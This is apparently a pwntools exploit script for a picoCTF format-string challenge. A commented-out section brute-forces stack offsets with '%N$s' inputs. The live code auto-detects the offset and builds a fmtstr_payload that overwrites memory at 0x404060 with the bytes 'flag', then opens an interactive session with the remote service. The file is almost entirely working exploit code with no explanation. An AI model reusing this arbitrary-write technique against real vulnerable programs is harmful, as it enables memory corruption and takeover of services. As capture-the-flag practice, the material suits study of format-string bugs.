# from pwn import context, remote

# HOST, PORT = "rhea.picoctf.net", 62327
# context.log_level = "CRITICAL"

# target_value = 0x21737573
# start_offset = 1
# max_offset = 100


# for offset in range(start_offset, max_offset + 1):
#     p = remote(HOST, PORT)
#     p.recvuntil(b"What do you have to say?")
#     p.sendline(f"%{offset}$s".encode("ascii"))

#     p.recvline()
#     response = p.recvline().decode()
#     response = response.split(":")[1].strip()

#     try:
#         value = int(response, 16)
#         print(f"Offset {offset}: {hex(value)}")

#         if value == target_value:
#             print(f"Found target value {hex(target_value)} at offset {offset}")
#             break
#     except ValueError:
#         print(f"Offset {offset}: Non-numeric response: {response}")
#     finally:
#         p.close()

# else:
#     print(
#         f"Target value {hex(target_value)} "
#         f"not found in offsets {start_offset} to {max_offset}."
#     )

from pwn import FmtStr, context, fmtstr_payload, remote

HOST = "rhea.picoctf.net"
PORT = 62327

context.log_level = "critical"
context.arch = "amd64"

p = remote(HOST, PORT)


def exec_fmt(payload):
    p = remote(HOST, PORT)
    p.recvuntil(b"What do you have to say?")
    p.sendline(payload)
    return p.recvall()


autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

p.recvuntil(b"What do you have to say?")
payload = fmtstr_payload(offset, {0x404060: 0x67616C66})

p.sendline(payload)

p.interactive()
